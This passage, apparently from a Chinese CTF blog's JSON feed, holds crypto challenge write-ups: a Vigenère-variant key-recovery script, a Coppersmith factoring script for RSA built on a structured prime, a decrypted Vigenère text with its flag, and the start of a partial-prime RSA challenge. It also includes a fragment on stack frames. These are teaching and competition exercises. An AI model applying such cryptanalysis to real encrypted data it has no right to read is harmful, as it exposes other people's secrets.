/></p>\n<h1 id=\"fig-8\"><a class=\"anchor\" href=\"#fig-8\">#</a> Fig 8.</h1>\n<p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。<br />\n将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内<br />\n至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。<br />\n<img data-src=\"/img/PWN/fig8.jpg\" alt=\"avatar\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/crypto/",
            "url": "https://zephyr-cyber.github.io.git/crypto/",
            "title": "crypto",
            "date_published": "2021-12-01T01:05:47.224Z",
            "content_html": "<p>2021/10/21 更新了高位截肢</p>\n<h1 id=\"高新区比赛\"><a class=\"anchor\" href=\"#高新区比赛\">#</a> 高新区比赛</h1>\n<p>V^3<br />\n 好像是一个 2017 年的题改的<br />\n cnhongke {bf7e02677b4faab7808d1580fd5bb}<br />\n 也可以手动爆破<br />\n就是按照对应关系<br />\n然后逐位加密<br />\n你会发现到第六个就开始变成对称了<br />\n所以手动跑 5 次就出结果了<br />\n exp 都多余了<br />\n附上 exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">_l</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>idx<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">,</span> k1<span class=\"token punctuation\">,</span> k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    s <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>_l<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    i1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    i2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    decrypted <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> ct<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">[</span>i1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">[</span>i2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                decrypted <span class=\"token operator\">+=</span> c</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        i1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        i2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i2 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> decrypted</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> k1<span class=\"token punctuation\">,</span> k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>_l<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    i1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    i2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        c <span class=\"token operator\">+=</span> t<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">[</span>i1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">[</span>i2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        i1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        i2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i2 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">recover_key</span><span class=\"token punctuation\">(</span>known_prefix<span class=\"token punctuation\">,</span> ciphertex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    final_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">14</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">for</span> pos <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            partial_candidate_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">14</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            partial_candidate_key<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            partial_candidate_key<span class=\"token punctuation\">[</span><span class=\"token number\">13</span> <span class=\"token operator\">-</span> pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>partial_candidate_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            res <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>known_prefix<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> ciphertex<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                final_key<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                final_key<span class=\"token punctuation\">[</span><span class=\"token number\">13</span> <span class=\"token operator\">-</span> pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token keyword\">print</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>final_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>final_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    ciphertext <span class=\"token operator\">=</span> <span class=\"token string\">\"POR4dnyTLHBfwbxAAZhe&#125;&#125;ocZR3Cxcftw9\"</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    key <span class=\"token operator\">=</span> recover_key<span class=\"token punctuation\">(</span><span class=\"token string\">\"SECCON&#123;\"</span><span class=\"token punctuation\">,</span> ciphertext<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    flag <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"rsarepeat\"><a class=\"anchor\" href=\"#rsarepeat\">#</a> RSArepeat</h1>\n<p>这题好像也有层一样的，比赛真 lao<br />\n 给出加密脚本</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom Crypto.Util.number import *\nimport gmpy2\nimport os\nfrom secret import flag\n\n\np = gmpy2.next_prime(bytes_to_long(os.urandom(32) * 10))\nq = getPrime(2048)\nn = p * q\nm = bytes_to_long(flag)\ne = 65537\nc = pow(m, e, n)\nprint 'n = ' + str(n)\nprint 'c = ' + str(c)\n\n\n运行结果输出\n# n = 9120210412817098868567410854637632250220555881403526554620639158581419400118706476426462580532569560128403528542849222604236640862674516611277130361890497616002043535833874824203278779255224103895976559478230598208736638548838369515266506758788653023380759388265524679357661867344583727639009050611035809615332415345615636794183389139631751072725812173232153921977529854299720035907475080123728133963132357285009229616899363413864250134103133772163607484794238528972871955212167583918722247406108717508117668301570190879613631465451744135100528987401664293214977426648232669628002711796584477405954390921585168542545024508132280795239187047607902042772074354512983547626983416047058674495234725402709185065533866399101327869049927071762987405052014360342557346201760417195526717659432120957024932822171629034785982161149134423193624715061013742839402782240625571812632970088905336230003285927069650264756078977556405903281928093668669291639199556779542688708405151017597677182338101624350346890556571828242761503472862589187188272783083175514693346986425145048900560704517281059296515380916946885637766528669652741939121435925118622627340581156923111326642804173809225000120356084999577920000481451709828075752253192537628742219663830938886966680564258836058435847445136469870523064012091603727249413340707659477419033271750976011384443208371660411376327908639483034074911057106131325663\n# c = 7068462753085070298092306006815948822917293261569147262935876173777154611330212172780298815871946045639185357656186163809499649889823797927617022879328397754544340874952687572138224768719999154448738757631265317915591819395360957051438805269461772096089208044993726972263528636921213722053915213474520713305628933165329554039041526341429811011879399124487420973883220496337343697082485151325947637134492168684404895651666064423117891350949942888278577264641878267652440305311472437072576068073588628794693349303196170011208043072754814062079404857657352761995684725014730958374555123902870761944058212939416619872746207245705213743023048901892977114871581000445118225605980711967279184600832881914000747237143653411293658641093111449235793736446421524719927367452081557329271167988711131750096910582920748875147684842547191116046110455610485921697703084407073334158845880179092914138111196153821093666870713318435216431977100255451151613217255214311447270315317924828002186873831048826117341746203538919869858723643158591679168166815433400943179342639989830429265410316662281946735133048179580170395697284908451588172527612828357594205617900793644449780703541620423822874332895281227408264377675840472406248296158342659308845264164232068007825845287325024564804783116616695927303806931940737550484802677095488750998780934178991718038605826623684585430755074719975767565185371149546480577\n\n</code></pre>\n<p><img data-src=\"/img/CRYPTO/gaoxinqu1.jpg\" alt=\"avatar\" /><br />\n<img data-src=\"/img/CRYPTO/gaoxinqu2.jpg\" alt=\"avatar\" /></p>\n<p>附上 exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!python2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># @FileName: tt.py</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">5723803231105438067621879312731287221934357097569268166420520040038029065761152553810494005387890506233399584147246538077002208499639437803910245817342952372458171365752480055753844375305610474395282822742943102904320741363812652705261682747336617279332644951905181705937705454682585492345619282271549850191266841799115355201225481894665469006243078988838181049476985523095183211083306888898330855716843411424493132244378006508444594329543929521327878717314543259397842391141445238073295183064204038877358053346160904246766744058035260700906186262991418344028036927076898224775513313992135215728859733003918328707361999295628679324987941544108516966440200369017207031702010292125100166826894159577761774445100777211415862293977599736904535299914065534202980062824965765410888738320552504576390375348702993646394541895827629891842496139670703262245710062952138603857926812293927639685763696276258111848707179034963859209200388611940617575570592428927246122690317085150458638646993030523460057013506016279214894927343923461607646478524983809407592464446504390449868558006440884166283766345457345779137687215125369153544179042534504852071842244821976629524307628462619103368289645015324069375881393414723379127777033799199839545069927720992165031027897683055528657202955467661225465098604530590852960596629917086084805687598732530884961789893076147057895925224397540225533098516204541840889</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>t<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">31</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x01'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#print t</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>K <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>P<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>K<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    r <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">*</span>t <span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>beta<span class=\"token operator\">=</span><span class=\"token number\">0.45</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> r<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">print</span> i<span class=\"token punctuation\">,</span>r</pre></td></tr></table></figure><h1 id=\"维吉尼亚\"><a class=\"anchor\" href=\"#维吉尼亚\">#</a> 维吉尼亚</h1>\n<p>听名字就知道</p>\n<pre><code>Vvr Ifnvaus Bdwokv Gbtrzsa Vkqgofntja rrlznxk eflvkozjcdue rs “mzg oez ff pjkhvtx ok kqzioeg vgfsf.” Zyil au vvykokaeoyrp avuwfnzv, bnl fcry eom ucdgaie mzg qhxiegl dfrguta gh huk wixdf ce oks ijggrtk-dtq uqvketbxkq sulnwsvwbtj. Taw fssoeimaqb sutulwu gbrvlr gp huk towwu hugk htng prke ulwf tbx teglwfvkj th wpoorv sxutsg ifmfmpwpgkihf. Dig iiyilquegghr fqknjryl wpqbsgalkgg zath fgts gnrn mzkg: vz uetdu kvzy mxujoaojml xqf rtjukapu vtkezjkhl, zvcafkehkj fhj glpnrnzapu fktrxl msly, grhlqqbrj fhj cignvnmaeogoeg nkgff, kcevltcaot anuvwbtj agv gzrikihfu, rvmzttd eofn, rnw eqfr. Cztagwh nzkefhvwam ko ijqjvjv a vgodykke vzcfnikekabogofn, pw ychru stq vvnz dowwtb pxppmgifnvyy bfxcybvs mzg ggauy hx oognvmtlkqnr kevzpwdavs ygt grilrbfi rvmzttd kbsuimtlkca, ypsmwog, ntu dbkvfvhltxv eczvlttlkcay rgtapgg guvxjuoeorl tlvopqj. CgZqbtQv&#123;3ayuc4r633096o2737&#125;\n</code></pre>\n<p>直接维吉尼亚枚举</p>\n<pre><code>The Concise Oxford English Dictionary defines cryptography as “the art of writing or solving codes.” This is historically accurate, but does not capture the current breadth of the field or its present-day scientific foundations. The definition focuses solely on the codes that have been used for centuries to enable secret communication. But cryptography nowadays encompasses much more than this: it deals with mechanisms for ensuring integrity, techniques for exchanging secret keys, protocols for authenticating users, electronic auctions and elections, digital cash, and more. Without attempting to provide a complete characterization, we would say that modern cryptography involves the study of mathematical techniques for securing digital information, systems, and distributed computations against adversarial attacks. CnHongKe&#123;3afca4d633096b2737&#125;\n</code></pre>\n<p>真 lao</p>\n<h1 id=\"高位截肢\"><a class=\"anchor\" href=\"#高位截肢\">#</a> 高位截肢</h1>\n<p>題目源代碼</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag&#123;********************************&#125;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getprime</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        n <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">while</span> n<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> bits<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            n <span class=\"token operator\">*=</span> next_prime<span class=\"token punctuation\">(</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p <span class=\"token operator\">=</span> getprime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>q <span class=\"token operator\">=</span> getprime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>mod <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">[</span>mod<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>getprime<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">[</span>res<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>c<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">>></span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>mod<span class=\"token punctuation\">,</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td 